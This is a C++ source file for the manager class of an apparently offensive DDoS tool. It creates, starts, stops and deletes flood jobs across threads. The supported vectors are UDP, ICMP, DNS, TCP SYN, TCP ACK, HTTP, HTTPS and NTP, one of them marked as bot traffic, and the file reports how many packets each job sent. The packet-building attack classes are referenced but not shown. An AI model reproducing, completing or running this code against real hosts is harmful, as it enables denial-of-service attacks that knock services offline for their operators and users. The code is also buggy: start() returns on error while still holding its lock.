#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/resource.h>

#include "xtool.h"
#include "netpool.h"
#include "CDDoSParams.h"
#include "CAttackMgr.h"

#include "CTcpSynAtk.h"
#include "CTcpAckAtk.h"
#include "CHttpAtk.h"
#include "CUdpAtk.h"
#include "CDnsAtk.h"
#include "CNtpAtk.h"
#include "CIcmpAtk.h"

CAttackMgr g_attackMgr;

CAttackMgr::CAttackMgr() {
	// TODO Auto-generated constructor stub
	MUTEX_SETUP(m_job_lock);
}

CAttackMgr::~CAttackMgr() {
	// TODO Auto-generated destructor stub
	MUTEX_CLEANUP(m_job_lock);
}

CAttack* CAttackMgr::add_attack_job(CDDoSParam &ddos_params)
{
	CAttack *newJob = NULL;

    switch(ddos_params.m_type)
    {
        case ATK_VEC_UDP:
            newJob = new CUdpAtk(ddos_params);
            break;
		case ATK_VEC_ICMP:
			//printf("%d check params failed\n", ddos_params.m_type);
			RC_LOG_INFO("CAttackMgr::add_attack_job is called");
			newJob = new CIcmpAtk(ddos_params);
			break;
        case ATK_VEC_DNS:
            newJob = new CDnsAtk(ddos_params);
            break;
        case ATK_VEC_SYN:
            newJob = new CTcpSynAtk(ddos_params);
            break;
        case ATK_VEC_ACK:
            newJob = new CTcpAckAtk(ddos_params);
            break;
        case ATK_VEC_HTTP:
            newJob = new CHttpAtk(ddos_params);
            break;
        case ATK_VEC_HTTPS:
            /*connect, and send ack packet that dstport is http*/
            ddos_params.m_is_bot = true;
            newJob = new CTcpAckAtk(ddos_params);
            break;
        case ATK_VEC_NTP:
            newJob = new CNtpAtk(ddos_params);
            break;
        default:
            RC_LOG_ERROR("INVALID ATTCK TYPE  %d", ddos_params.m_type);
            return NULL;
            break;
    }
    
    if (NULL == newJob)
    {
        RC_LOG_ERROR("new attack failed");
        return NULL;
    }
  
    //newJob->set_ddos_params(&ddos_params);

    if (newJob->check_params() == false)
    {
        printf("%s check params failed\n", newJob->m_name);
        delete newJob;
        return NULL;
    }

    MUTEX_LOCK(m_job_lock);
    m_attk_jobs.push_back(newJob);
    MUTEX_UNLOCK(m_job_lock);

    return newJob;
}

void CAttackMgr::del_attack_job(CAttack *attk_job)
{
    RC_LOG_INFO("del attack job %s", attk_job->m_name);

    MUTEX_LOCK(m_job_lock);
    m_attk_jobs.remove(attk_job);
    MUTEX_UNLOCK(m_job_lock);

    delete attk_job;
}


void CAttackMgr::expire_handle()
{
    ATTACK_LIST_Itr itr;

    MUTEX_LOCK(m_job_lock);
    for (itr = m_attk_jobs.begin();
            itr != m_attk_jobs.end();
            itr++)
    {
        (*itr)->expire_handle();
    }
    MUTEX_UNLOCK(m_job_lock);
}

void CAttackMgr::attack_handle(int thrd_index, bool *is_all_job_stopped, bool *is_all_job_paused)
{
    ATTACK_LIST_Itr itr;
    bool jobs_stopped = true;
    bool jobs_paused = true;

    //MUTEX_LOCK(m_job_lock);
    for (itr = m_attk_jobs.begin();
            itr != m_attk_jobs.end();
            itr++)
    {
        (*itr)->attack_handle(thrd_index);

        if ((*itr)->m_job_status == JOB_GOON)
        {
            jobs_stopped = false;
            jobs_paused = false;
        }
        else if ((*itr)->m_job_status == JOB_PAUSE)
        {
            jobs_stopped = false;
        }
        else if ((*itr)->m_job_status == JOB_STOP)
        {
            jobs_paused = false;
        }
    }
    //MUTEX_UNLOCK(m_job_lock);

    *is_all_job_stopped = jobs_stopped;
    *is_all_job_paused = jobs_paused;
}

void CAttackMgr::destroy()
{
    MUTEX_LOCK(m_job_lock);

    ATTACK_LIST_Itr itr;

    for (itr = m_attk_jobs.begin();
            itr != m_attk_jobs.end();
            )
    {
        RC_LOG_INFO("delete %s attack job", (*itr)->m_name);
        delete *itr;
        itr = m_attk_jobs.erase(itr);
    }
    MUTEX_UNLOCK(m_job_lock);
}

int CAttackMgr::start()
{
    ATTACK_LIST_Itr itr;
    CAttack *jobNode = NULL;

    /*come on*/
	
    MUTEX_LOCK(m_job_lock);
    for (itr = m_attk_jobs.begin();
            itr != m_attk_jobs.end();
            itr++)
    {
        RC_LOG_INFO("CAttackMgr::start() --- attack starting");
        jobNode = *itr;
        if (RC_OK != jobNode->start())
        {
            return RC_ERROR;
        }
        jobNode->m_job_status = JOB_GOON;
		RC_LOG_INFO("CAttackMgr::start() --- %s attack started", jobNode->m_name);
        //RC_LOG_INFO("%s attack started", jobNode->m_name);
    }
    MUTEX_UNLOCK(m_job_lock);
    return RC_OK;
}

void CAttackMgr::stop()
{
    ATTACK_LIST_Itr itr;
    CAttack *jobNode = NULL;

    /*come on*/
    MUTEX_LOCK(m_job_lock);
    for (itr = m_attk_jobs.begin();
            itr != m_attk_jobs.end();
            itr++)
    {
        jobNode = *itr;
        RC_LOG_INFO("stop %s attack", jobNode->m_name);
        jobNode->stop();
    }
    MUTEX_UNLOCK(m_job_lock);
    return;
}

//当所有的攻击作业都停止以后返回true
bool CAttackMgr::is_all_stopped()
{
    ATTACK_LIST_Itr itr;
    CAttack *jobNode = NULL;
    bool is_all_ended = true;

    /*come on*/
    MUTEX_LOCK(m_job_lock);
    for (itr = m_attk_jobs.begin();
            itr != m_attk_jobs.end();
            itr++)
    {
        jobNode = *itr;
        if (jobNode->is_stopped() == false)
        {
            is_all_ended = false;
            break;
        }
    }
    MUTEX_UNLOCK(m_job_lock);

    return is_all_ended;
}

void CAttackMgr::self_check_stopped()
{
	ATTACK_LIST_Itr itr;
    CAttack *jobNode = NULL;

    /*come on*/
    MUTEX_LOCK(m_job_lock);
    for (itr = m_attk_jobs.begin();
            itr != m_attk_jobs.end();
            )
    {
        jobNode = *itr;
        if (jobNode->is_stopped() == true)
        {
            RC_LOG_INFO("delete %s attack job", jobNode->m_name);
            delete jobNode;
            itr = m_attk_jobs.erase(itr);
        }
        else
        {
            itr++;
        }
    }
    MUTEX_UNLOCK(m_job_lock);

    return;
}

void CAttackMgr::post_out(uint64_t eclipase_sec)
{
    ATTACK_LIST_Itr itr;
    CAttack *jobNode = NULL;

    /*come on*/
    MUTEX_LOCK(m_job_lock);
    for (itr = m_attk_jobs.begin();
            itr != m_attk_jobs.end();
            itr++)
    {
        jobNode = *itr;
        printf("%s attack finished, send %u packets.\n", jobNode->m_name, jobNode->m_curcnt_total);
    }
    MUTEX_UNLOCK(m_job_lock);
}
